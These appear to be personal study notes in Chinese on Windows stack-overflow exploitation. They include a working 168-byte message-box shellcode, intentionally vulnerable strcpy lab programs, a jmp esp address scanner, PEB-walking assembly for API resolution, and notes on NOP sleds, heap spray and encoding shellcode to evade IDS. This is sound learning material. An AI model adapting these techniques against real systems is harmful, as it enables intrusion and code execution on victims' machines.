# 弹窗机器码 （168字节）

```
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8" 
```



# 漏洞利用技术中一些相对独立的过程

（1）触发漏洞：缓冲区有多大，第几个字节可以淹没返回地址，用什么样的方法植入代码？ （2）选取 shellcode：执行什么样的 shellcode 决定了漏洞利用的性质。例如，是作为安全测 试而弹出的一个消息框，还是用于入侵的端口绑定、木马上传等。 

（3）重要参数的设定：目标主机的 IP 地址、bindshell 中需要绑定的端口号、消息框所显示 的内容、跳转指令的地址等经常需要在 shellcode 中进行修改。 

（4）选用编码、解码算法：在第 3 章中曾经介绍过，实际应用中的 shellcode 往往需要经过 编码（加密）才能安全地送入特定的缓冲区；执行时，位于 shellcode 顶部的若干条解码指令会 首先还原出原始的 shellcode，然后执行

# 常用汇编指令

一个字节8bit

一个十六进制位表示4个二进制

一个字节=八位二进制数

## 1.ret和call

1.**call和ret指令都是转移指令**，它们都修改IP的值，或同时修改CS和IP的值。它们经常共同用语实现子程序的设计。

2.**ret指令用栈中的数据**，修改IP的内容，从而实现**近转移**。

3.**retf指令用栈中的数据**，修改CS和IP的内容，从而实现**远转移**。

4.CPU执行ret指令时，相当于进行：

pop IP

执行retf指令时，相当于进行：

pop IP

pop CS

5.CPU执行call指令时，进行两步操作：

(1)将当前的IP或CS和IP压入栈中；

(2)转移

6.**call指令不能实现短转移，call指令实现转移的方法和jmp指令的原理相同**。

## 2.ror

ROR（循环右移）指令把所有位都向右移，最低位复制到进位标志位和最高位。该指令格式与 SHL （左移）指令相同

![image-20220405112721904](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220405112721904.png)

## 3.xor

XOR 指令在两个操作数的对应位之间进行（按位）逻辑异或（XOR）操作，并将结果存放在目标操作数中

## 4.XCHG

XCHG（交换数据）指令交换两个操作数内容。该指令有三种形式：

XCHG reg, reg
XCHG reg, mem
XCHG mem, reg

## 5.LODSB、和LODSD

LODSB、 和 LODSD 指令分别从 ESI 指向的内存地址加载一个字节或一个字到 AL/EAX。并且增加esi

## 6.STOSB、STOSW 和 STOSD 

STOSB、STOSW 和 STOSD 指令分别将 AL/AX/EAX 的内容存入由 EDI 中偏移量指向的内存位置。EDI 根据方向标志位的状态递增或递减。

## 7.PUSH AD和POP AD

PUSH AD 指令

本指令将EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI 这8个32位通用寄存器依次压入堆栈,其中SP的值是在此条件指令未执行之前的值.压入堆栈之后,ESP-32–>ESP.

POP AD 指令

本指令依次弹出堆栈中的32位字到 EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX中,弹出堆栈之后,ESP+32–>ESP.

## 8.cdq

用 edx 把 eax 扩展成四字。这条指令在 eax<0x80000000 时可用作 mov edx ,  NULL

# 常用寄存器

## 1.ESI/EDI

ESI/EDI 分别叫做"源/目标索引寄存器"(source/destination index),因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串.







# 第1章 工具的使用

## 1.1 PE文件

PE文件是win平台下（Protable Executable）

![image-20220411194645742](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411194645742.png)

### 1.1 .1 PE 文件与虚拟内存之间的映射

（1）静态反汇编工具看到的 PE 文件中某条指令的位置是相对于磁盘文件而言的，即所谓 的文件偏移，我们可能还需要知道这条指令在内存中所处的位置，即虚拟内存地址（VA）。

（2）反之，在调试时看到的某条指令的地址是虚拟内存地址，我们也经常需要回到 PE 文 件中找到这条指令对应的机器码

### 1.1.2 不同地址的相关概念

![image-20220411194710320](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411194710320.png)

### 1.1.3 节偏移

![image-20220411194734522](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220411194734522.png)

 

***\*两个地址  调试时看到的是虚拟内存地址  修改时要修改的是文件偏移地址\****

 

 

## 1.2.工具（常用四种1.lordpe 2.ida  3.ollydbg   4.UE）

(1.计算地址    2.静态调试  3.动态调试  4.修改)

### 1.2.1.LordPE(查看相关地址)

![image-20220429145953066](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429145953066.png)

![image-20220429150031927](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150031927.png)

 

例子

![image-20220429150059421](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150059421.png)

 

### 1.2.2.Ida 静态反编译软件

![image-20220429150119614](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150119614.png)

（1）打开文件后可以点击菜单栏的Jump-->Jump o function 查找函数 ***\*快捷键G\**** 跳入到输入的地址。

（2）**空格** 可以切换汇编代码为流程图浏览模式，在流程图模式下，绿线代表判定条件成立，红线代表判定条件不成立
（3）**文本搜索**相当于对反汇编列表窗口进行子字符串搜索。通过Search->Text（热键：ALT+T）命令启动文本搜索选择Find all occurences（查找所有结果），IDA将在一个新的窗口中显示搜索结果，最后，使用CTRL＋T或Search->Next Text（Ctrl+T）命令可重复前一项搜索，以找到下一个匹配结果  //文本搜索不一定准确，

常用快捷键：  

f5 		  反汇编

ALT+T   命令启动文本搜索

； 		  在反汇编后的界面中写下注释

![image-20220429150237601](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150237601.png)

***\*对汇编代码的标注可以自上而下进行，也可以自下而上进行。自上而下是指从 main 函数 开始标注，相当于对函数调用图从树根开始遍历；自下而上逆向是指从比较底层的经常被调用 的子函数开始标注，每标注一个这样的底层函数，代码单元的可读性就会增加许多，当最终标 注到 main 函数时，整个程序的功能和流程就基本上可以掌握了。\****

 

### 1.2.3.OllyDbg动态追踪工具

***\*查看时，main()函数 大多数情况下会有3次压栈操作 push  可在附近设置断点\****

![image-20220429150251481](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150251481.png)

 

![image-20220429150306217](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150306217.png)

Ctrl+F2  重启

***\*F2\****设置断点

***\*进入              F7\****

设置动画           Ctrl+F7

***\*单步执行            F8\****

**执行到光标处  F4**

设置动画结束        Ctrl+F8

***\*运行应用程序          F9\****

传递异常处理程序并运行   Shift+F9

执行直到返回        Ctrl+F9

执行到用户代码       Alt+F9

跟踪开始          Ctrl+F11

跟踪结束          Ctrl+F12

暂停             F12

断点窗口 atl+b



 设置新的EIP   在想要执行的地址处 右键  new origin here

![image-20220427110840065](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220427110840065.png)

### 1.2.**4.** UE

***\*Ctrl+G  跳转到该地址\****





# 第2章栈溢出原理与实践

## 2.1程序运行在内存中的过程

![image-20220429150358282](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150358282.png)

 

​		根据操作系统的不同、编译器和编译选项的不同，**同一文件不同函数的代码在内存代码区 中的分布可能相邻，也可能相离甚远**，可能先后有序，也可能无序，；但它们都在同一个 PE 文 件的代码所映射的一个“节”里。我们可以简单地把它们在内存代码区中的分布位置理解成是 散乱无关的。

​		代码区中精确的跳转都是在与***系统栈***  巧妙地配合过程中完成的。当函数被调用 时，系统栈会为这个函数开辟一个新的**栈帧**，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所 对应的栈帧。

​	例子  该执行时系统栈发生的变化

![image-20220429150501996](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150501996.png)

![image-20220429150715623](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150715623.png)

## 2.2寄存器与函数栈帧

每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提 供两个特殊的寄存器用于标识位于系统栈顶端的栈帧。

**（1）*****\*ESP\****：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向 系统栈最上面一个栈帧的栈顶。 

**（2）*****\*EBP\****：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向 系统栈最上面一个栈帧的底部。

注：EBP 指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。

**（3）*****\*函数栈帧\****：ESP 和 EBP 之间的内存空间为当前栈帧，EBP 标识了当前栈帧的底部，ESP 标识了当前栈帧的顶部.

函数栈帧中，一般包含以下几类重要信息。 

***\*1.\*******\*局部变量\****：为函数局部变量开辟的内存空间。 

***\*2.\*******\*栈帧状态值\****：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部 可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。 

***\*3.\*******\*函数返回地址\****：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置， 以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令![image-20220429151003530](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429151003530.png)

栈帧的底部存放着前栈帧 EBP，栈帧的顶部存放着返回地址。

 

**（4）*****\*EIP：\****指令寄存器(Extended Instruction Pointer)，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址

可以说如果控制了 EIP 寄存器的内容，就控制了进程——我们让 EIP 指向哪里，CPU 就会 去执行哪里的指令。

 

## 2.3函数调用 

大致包括以下几个步骤

（1）参数入栈：将参数（传入函数的参数）从右向左依次压入系统栈中。 

（2）返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继 续执行。

（3）代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。 

（4）栈帧调整：（ 具体包括） 

保存当前栈帧状态值，已备后面恢复本栈帧时使用（EBP 入栈）；

将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）；

给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）

（栈的地址由高到低拓展）

![image-20220429150930662](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429150930662.png)

相应汇编指令  可根据判断函数调用

![image-20220429151038690](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429151038690.png)

函数调用返回值存入eax寄存器中

## 2.4函数返回  

 步骤如下

（1）保存返回值：通常将函数的返回值保存在寄存器 EAX 中

（2）弹出当前栈帧，恢复上一个栈帧。 

具体包括：

 \* 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。 

\* 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。 * 将函数返回地址弹给 EIP 寄存器。

（3）跳转：按照函数返回地址跳回母函数中继续执行

相应的汇编指令

addesp, xxx 		;降低栈顶，回收当前的栈帧			

pop ebp			;将上一个栈帧底部位置恢复到 ebp		

Retn				; 这条指令有两个功能	：				

a)弹出当前栈顶元素，即弹出栈帧中的返回地址。 至此， ;栈帧恢复工作完成 。

b)让处理器跳转到弹出的返回地址，恢复调用前的代码区					  

 

栈帧的变化 例

![image-20220429151156656](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220429151156656.png)



## 实验 2.2利用栈溢出  修改邻接变量  

突破密码验证程序

实验源码

```
#include <stdio.h> 
#define PASSWORD "1234567" 
int verify_password (char *password) 
{ 
 int authenticated; 
 char buffer[8];// add local buffto be overflowed 
 authenticated=strcmp(password,PASSWORD); 
 strcpy(buffer,password);//over flowed here! 
 return authenticated; 
} 
main() 
{ 
 int valid_flag=0; 
 char password[1024]; 
 while(1) 
 { 
 printf("please input password: "); 
 scanf("%s",password); 
 valid_flag = verify_password(password); 
 if(valid_flag) 
 { 
 printf("incorrect password!\n\n"); 
 } 
 else 
 { 
 printf("Congratulation! You have passed the 
 verification!\n"); 
 break; 
 } 
 } 
}
```

## 实验2.3 修改函数返回地址

利用栈溢出修改返回地址

要达到实验目的我们都需要做的工作：

 （1）要摸清楚栈中的状况，如函数地址距离缓冲区的偏移量等。这虽然可以通过分析代码 得到，但我还是推荐从动态调试中获得这些信息。

（2）要得到程序中密码验证通过的指令地址，以便程序直接跳去这个分支执行。 

（3）要在 password.txt 文件的相应偏移处填上这个地址。

实验源码

```
#include <stdio.h> 
#include<string.h>
#include<stdlib.h>
#define PASSWORD "1234567" 
int verify_password (char *password) 
{ 
 int authenticated; 
 char buffer[8]; 
 authenticated=strcmp(password,PASSWORD); 
 strcpy(buffer,password);//over flowed here! 
 return authenticated; 
} 
int main() 
{ 
 int valid_flag=0; 
 char password[1024]; 
 FILE * fp; 
 if(!(fp=fopen("password.txt","rw+"))) 
 { 
 exit(0); 
 } 
 fscanf(fp,"%s",password); 
 valid_flag = verify_password(password); 
 if(valid_flag) 
 { 
 printf("incorrect password!\n"); 
 } 
 else 
 { 
 printf("Congratulation! You have passed the verification!\n"); 
 } 
 fclose(fp); 
return 0;
} 
```

## 实验 2.4代码植入

 原理 ： 在缓冲区填入要执行的代码，并利用栈溢出将返回地址返回到缓冲区开始地址

实验源码

```
#include <stdio.h> 
#include <windows.h> 
#include<stdlib.h>
#include<string.h>
#define PASSWORD "1234567" 
int verify_password (char *password) 
{ 
 int authenticated; 
 char buffer[44]; 
 authenticated=strcmp(password,PASSWORD); 
 strcpy(buffer,password);//over flowed here! 
 return authenticated; 
} 
main() 
{ 
 int valid_flag=0; 
 char password[1024]; 
 FILE * fp; 
 LoadLibrary("user32.dll");//prepare for messagebox 
 if(!(fp=fopen("password.txt","rw+"))) 
 { 
 exit(0); 
 } 
 fscanf(fp,"%s",password); 
 valid_flag = verify_password(password); 
 if(valid_flag) 
 { 
 printf("incorrect password!\n"); 
 } 
 else 
 { 
 printf("Congratulation! You have passed the verification!\n"); 
 } 
 fclose(fp); 
} 
```

# 第3章 开发shellcode的艺术

## 3.1 shellcode需要解决的问题

### 1.定位shellcode的起始地址

在 实际调试漏洞时，尤其是在调试 IE 中的漏洞时，我们经常会发现有缺陷的函数位于某个动态 链接库中，且在程序运行过程中被动态装载。这时的栈中情况将会是动态变化着的，也就是说， 这次从调试器中直接抄出来的 shellcode 起始地址下次就变了。

### 2.怎样组织缓冲区的内容

（shellocode，函数返回地址，一些用于填充的数据）

### 3.自动获得api

不同的机器、不同的操作系统中同一个 API 函数的入口地址往往会有差异，直接使用手工查出的 API 地址的 shellcode 很可能在调试通过后换一台计算机就会因为函数地址不同而出错。为此，我们 必须让 shellcode 自己在运行时动态地获得当前系统的 API 地址

### 4.shellcode编码解码

### 5.在缓冲区空间有限的情况下，减少shellcode的尺寸

## 3.2定位shellcode

### 3.2.1  “跳板”  原理

![image-20220404110449929](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404110449929.png)

由于ESP寄存器在函数返回后不被溢出数据干扰，且始终指向返回地址之后的位置，我们可以使用上图中的方法定位

（1）用内存中任意一个 jmp esp 指令的地址覆盖函数返回地址，而不是原来用手工查出的 shellcode 起始地址直接覆盖。 

（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。 

（3）由于 esp 在函数返回时仍指向栈区（函数返回地址之后），jmp esp 指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。 

（4）重新布置 shellcode。**在淹没函数返回地址后，继续淹没一片栈空间**。将缓冲区前边一 段地方用任意数据填充，**把 shellcode 恰好摆放在函数返回地址之后**。这样，jmp  esp 指令执行 过后会恰好跳进 shellcode

### 3.2.2获取“跳板”的地址

获得 user32.dll 内跳转指令地址最直观的方法就是编程序搜索内存

#include <windows.h> 
#include <stdio.h> 
#define DLL_NAME "user32.dll" 
main() 
{ 
 BYTE* ptr; 
 int position,address; 
 HINSTANCE handle; 
 BOOL done_flag = FALSE; 
 handle=LoadLibrary(DLL_NAME); 
 if(!handle) 
 { 
 printf(" load dll erro !");
 exit(0);
 } 
 ptr = (BYTE*)handle; 
 for(position = 0; !done_flag; position++) 
 { 
 try
 { 
 if(ptr[position] == 0xFF && ptr[position+1] == 0xE4) 
 { 
 //0xFFE4 is the opcode of jmp esp
int address = (int)ptr + position;
 printf("OPCODE found at 0x%x\n",address);
 } 
 } 
 catch(...)
 { 
 int address = (int)ptr + position; 
 printf("END OF 0x%x\n", address); 
 done_flag = true; 
 } 
 }
}

// jmp es p 对应的机器码是 0xFFE4，上述程序的作用就是从 user32.dll 在内存中的基地址开 始向后搜索 0xFFE4，如果找到就返回其内存地址（指针值）

### 实验3.2   

（本人实验 入口地址77d507ea  退出函数地址7c81cafa）

在制作 exploit 的时候，还应当修复 2.4 节中 shellcode 无法正常退出的缺陷。为此，我们在 调用 MessageBox 之后，通过调用 exit 函数让程序干净利落地退出。

这里仍然用 dependency walker 获得这个函数的入口地址。如图 3.2.6 所示，ExitProcess 是 kernel32.dll 的导出函数，故首先查出 kernel32.dll 的加载基址 0x7C800000，然后加上函数的偏移地址 0x0001CDDA，得到函数入口最终的内存地址 0x7C81CDDA。

 ![image-20220404142712451](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404142712451.png)



##  3.3缓冲区的组织

### 3.3.1缓冲区的组成（有问题:shellcode header???）

​		如果选用 jmp esp 作为定位 shellcode 的跳板，那么在函数返回后要根据缓冲区大小、所需 shellcode 长短等实际情况灵活地布置缓冲区。

 送入缓冲区的数据可以分为以下几种：

（1）**填充物**：可以是任何值，但是一般用 NOP 指令对应的 0x90 来填充缓冲区，并把 shellcode 布置于其后。这样即使不能准确地跳转到 shellcode 的开始，只要能跳进填充区，处理器最终也 能顺序执行到 shellcode。 

（2）**淹没返回地址的数据**：可以是**跳转指令的地址、shellcode 起始地址**，甚至是一个近似的 shellcode 的地址。

（3）**shellcode**：可执行的机器代码。 在缓冲区中怎样摆放 shellcode 对 exploit 的成功至关重要。





**shellcode的摆放**

![image-20220404150023976](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404150023976.png)



**当缓冲区较大时**，我们倾向于像 2.4 节中那样把 shellcode 布置在缓冲区内。这样做有以下 好处：

1）合理利用缓冲区，使攻击串的总长度减小：对于远程攻击，有时所有数据必须包含在 一个数据包中！

2）对程序破坏小，比较稳定：溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。

即便是使用跳转指令来定位 shellcode，我们也可以把缓冲区布置成类似 2.4 节中那 样。例如，图 3.3.1 中的最后一种组织方式，在返回地址之后再多淹没一点，并在那里布置一 个仅仅几个字节的“shellcode hea der”，引导处理器跳转到位于缓冲区中那一大片真正的 shellcode 中去。

![image-20220404150844186](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404150844186.png)



###  3.3.2 抬高栈顶保护shellcode

当缓冲区相对 shellcode 较大时，把 shellcode 布置在缓冲区的“前端”（内存低址方向）， 这时 shellcode 离栈顶较远，几次压栈可能只会破坏到一些填充值 nop；但是，如果缓冲区已经 被 shellcode 占满，则 shellcode 离栈顶比较近，这时的情况就比较危险了.

如果 shellcode 中没有压栈指令向栈中写入数据还没有太大影响；但如果使用 push 指令在栈中暂存 数据，压栈数据很可能会破坏到 shellcode 本身。这个过程如图 3.3.2 所示。

![image-20220404151708480](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404151708480.png)

为了使 shellcode 具有较强的通用性，**我们通常会在 shellcode 一开始就大范围抬高栈顶， 把 shellcode“藏”在栈内，**从而达到保护自身安全的目的。这个过程如图 3.3.3 所示。

![image-20220404152308224](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404152308224.png)

### 3.3.3使用其他跳转指令

 ![image-20220404152508756](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404152508756.png)

### 3.3.4不适用跳转指令

个别有苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位 shellcode，而使用 shellcode 的静态地址来覆盖又不够准确，这时我们可以做一个折中：如果能够淹没大片的内存 区域，可以将 **shellcode 布置在一大段 nop 之后。这时定位 shellcode 时，只要能跳进这一大片 nop 中，shellcode 就可以最终得到执行**，如图 3.3.4 所示。这种方法好像蒙着眼睛射击，如果靶子无比大，那么枪枪命中也不是没有可能。

### 3.3.5函数返回地址移位

在一些情况下，返回地址距离缓冲区的偏移量是不确定的，这时我们也可以采取前面介绍 过的增加“靶子面积”的方法来提高 exploit 的成功率。

如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令的地址来 覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode 就可以得到执行。这个过程如图 3.3.5 所示。



![image-20220404153816297](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404153816297.png)

而不同的主机可能会有不同的程序安装目录。例如：

c:\failwest\  

c:\failwestq\  

c:\failwestqq\  

c:\failwestqqq\ 

这样，函数返回地址距离我们输入的字符串的偏移在不同的计算机上就有可能按照字节错 位，如图 3.3.6 所示。

![image-20220404154044671](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404154044671.png)

解决这种尴尬情况的一个办法是**使用字节相同的双字跳转地址**，甚至可以使用堆中的地 址，然后想办法将 shellcode 用堆扩展的办法放置在相应的区域。这种 heap s pray 的办法在 IE 漏洞的利用中经常使用，如图 3.3.7 所示

![image-20220404154223848](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220404154223848.png)

## 3.4开发通用的shellcode？？？？？

### 3.4.1定位API的原理00

不同的操作系统可能会影响动态链接库的加载基址

不用的补丁版本对应的动态链接库的内容有所不同，包括动态链接库文件的大小和到处函数的偏移地址，由于这些因素手工查出的API地址很可能会在其他计算机上失效。所以，**实际中使用的shellcode 必须还要能动态地获得自身所需的 API 函数地址。**

**Win_32 平台下的 shellcode 使用最广泛的方法，就是通过从进程环境块中找到动态链接库的导出表，并搜索出所 需的 API 地址，然后逐一调用。**





所有 win_32 程序都会加载 ntdll.dll 和 kernel32.dll 这两个最基础的动态链接库。如果想要 在 win_32 平台下定位 kernel32.dll 中的 API 地址，可以采用如下方法。 

（1）首先通过段选择寄存器FS 在内存中找到当前的线程环境块 TEB。（Thread Environment Block） 

（2）**线程环境块偏移位置为 0x30** 的地方存放着指向进程环境块 PEB 的指针。(Process Environment Block)

（3）进程环境块中偏移位置为 0x0C 的地方存放着指向 PEB_LDR_DATA 结构体的指针， 其中，存放着已经被进程装载的动态链接库的信息。

（4）**PEB_LDR_DATA 结构体偏移位置为 0x1C** 的地方存放着指向模块初始化链表的头指针 InInitializationOrderModuleList。

（5）模块初始化链表 InInitializationOrderModuleList 中按顺序存放着 PE 装入运行时初始化 模块的信息，第一个链表结点是 ntdll.dll，第二个链表结点就是 kernel32.dll。

（6）找到属于 **kernel32.dll 的结点后，在其基础上再偏移 0x08 就是 kernel32.dll 在内存中的 加载基地址。**

（7）从 kernel32.dll 的加载基址算起，偏移 0x3C 的地方就是其 PE 头。

（8）PE 头偏移 0x78 的地方存放着指向函数导出表的指针。

（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址，如图 3.4.1 所示

![image-20220405103806781](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220405103806781.png)

### 3.4.2 shellcode 的加载与调试？？





### 3.4.3 动态定位 API 地址的 shellcode ？？？？？

例：实现之前弹出消息框并显示“failwest”

需要使用如下 API 函数

（1）MessageBoxA   位于 user32.dll 中， 用于弹出消息框。

（2）ExitProcess    位于 kernel32.dll 中， 用于正常退出程序。

（3）LoadLibraryA  位于 kernel32.dll 中。  并不是所有的程序都会装载 user32.dll，所以在我 们调用 MessageBoxA 之前，应该先使用 LoadLibrary(“user32.dll”)装载其所属的动态链接库。





通常情况下，我们会对所需的 API 函数名进行 hash 运算，在搜索导出表时对当前遇到的函数 名也进行同样的 hash，这样只要比较 hash 所得的摘要（digest）就能判定是不是我们所需的 API 了。虽然这种搜索方法需要引入额外的 hash 算法，但是可以节省出存储函数名字符串的代码。

![image-20220405113317540](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220405113317540.png)

![image-20220405113205940](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220405113205940.png)

按照图 3.4.1 所示，定位 kernel32.dll 的代码如下。 

;find base addr of kernel32.dll 

mov ebx, fs:[edx + 0x30] ;      ebx = address of PEB  

mov ecx, [ebx + 0x0c] ;           ecx = pointer to loader data 

mov ecx, [ecx + 0x1c] ;          ecx = first entry in initialisation  ;order list  

mov ecx, [ecx] ;                   ecx = second entry in list  ;(kernel32.dll)

mov ebp, [ecx + 0x08] ;      ebp = base address of kernel32.dll 

![image-20220405113604219](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220405113604219.png)

## 3.5shellcode编码技术？？？？

### 3.5.1为什么要对shellcode编码

​          **首先**，所有的字符串函数都会对 NULL 字节进行限制。通常我们需要选择特殊的指令来避 免在 shellcode 中直接出现 NULL 字节（byte，ASCII 函数）或字（word，Unicode 函数）。

​          **其次**，有些函数还会要求 shellcode 必须为可见字符的 ASCII 值或 Unicode 值。

​           **最后**，除了以上提到的软件自身的限制之外，在进行网络攻击时，基于特征的 IDS 系统往 往也会对常见的 shellcode 进行拦截



​            我们可以先专心完成 shellcode 的逻辑，然后使用编码技术对 shellcode 进行编码，使其内容达到限制的要求，最后再精心构造十几个字节的解码程序，放在 shellcode 开始执行的地方。

![image-20220405162204504](C:\Users\jinwe\AppData\Roaming\Typora\typora-user-images\image-20220405162204504.png)

​         当 exploit 成功时，shellcode 顶端的解码程序首先运行，它会在内存中将真正的 shellcode 还原成原来的样子，然后执行之。这种对 shellcode 编码的方法和软件加壳的原理非常类似。

### 3.5.2会“变形”的shellcode

## 3.6为shellcode“减肥”?????

### 3.6.1常用方式

#### 1.“短”指令

 x86 指令集中指令所对应的机器码的长短是不一样的，有时候功能相似的指令的机器码长 度差异会很大。这里给出一些非常有用的单字节指令。

xchg eax,reg  交换 eax 和其他寄存器中的值

lodsd  把 esi 指向的一个 dword 装入 eax，并且增加 esi  

lodsb 把 esi 指向的一个 byte 装入 al，并且增加 esi  

stosd 

stosb 

pushad/popad 从栈中存储/恢复所有寄存器的值 

cdq  用 edx 把 eax 扩展成四字。这条指令在 eax<0x80000000 时可用作 mov edx ,  NULL

#### 2.“复合”指令

有时候我们可以把两件事情用一条指令完成，例如，用 xchg、lods 或者 stos。

#### 3.另类的 API 调用方式？？？？？？？

​         有些 API 中许多参数都是 NULL，通常的做法是多次向栈中压入 NULL。如果我们换一个 思路，把栈中的一大片区域一次性全部置为 NULL，在调用 API 的时候就可以只压入那些非NULL 的参数，从而节省出许多压栈指令。 

​        我们经常会遇到 API 中需要一个很大的结构体做参数的情况。通过实验可以发现，大 多数情况下，健壮的 API 都可以允许两个结构体相互重叠，尤其是当一个参数是输入结构 体[in]，另一个用作接收的结构体[out]时，如果让参数指向同一个[in]结构体，函数往往也 能正确执行。这种情况下，仅仅用一个字节的短指令“push esp”就可以代替一大段初始化 [out]结构体的代码。

#### 4.代码也可以当数据？？？？？？？？

​		很多 Windows 的 API 都会要求输入参数是一种特定的数据类型，或者要求特定的取值区 间。虽然如此，通过实验我们发现，大多数 API 出于函数健壮性的考虑，在实现时已经对非法 参数做出了正确处理。例如，我们经常见到 API 的参数是一个结构体指针和一个指明结构体大 小的值，而用于指明结构体大小的参数只要足够大，就不会对函数执行造成任何影响。如果在 编写 shellcode 时，发现栈区恰好已经有一个很大的数值，哪怕它是指令码，我们也可以把它的 值当成数据直接使用，从而节省掉一条参数压栈的指令。总之，在开发 shellcode 的时候，代码 可以是数据，数据也可以是代码！

#### 5.调整栈顶回收数据

​			普通程序员不会直接与系统栈打交道，通常与栈沟通的总是编译器。在编译器看来，栈仅 仅是用来保护函数调用断点、暂存函数输入参数和返回值等的场所。但是，作为一个 shellcode 的开发人员，必须富有更多的想象力。栈顶之上的数据在逻辑上视为废弃数据，但其物理内容 往往并未遭到破坏。如果栈顶之上有需要的数据，不妨调整 esp 的值将栈顶抬高，把它们保护 起来以便后面使用，这样能节省出很多用作数据初始化的指令。这与我们前边讲的抬高栈帧保 护 shellcode 有相似之处。

#### 6.巧用寄存器

​			按照默认的函数调用约定，在调用 API 时有些寄存器（如 EBP、ESI、EDI 等）总是被保 存在栈中。把函数调用信息存在寄存器中而不是存在栈中会给 shellcode 带来很多好处。比如大 多数函数的运行过程中都不会使用 EBP 寄存器，故我们可以打破常规，直接使用 EBP 来保存 数据，而不是把数据存在栈中。

​			 一些 x86 的寄存器有着自己特殊的用途。有的指令要求只能使用特定的寄存器；有的指令 使用特定寄存器时的机器码要比使用其他寄存器短。此外，如果寄存器中含有调用函数时需要 的数值，尽管不是立刻要调用这些函数，可能还是要考虑提前把寄存器压入栈内以备后用，以 免到时候还得另用指令重新获取。

#### 7.压缩法宝，hash

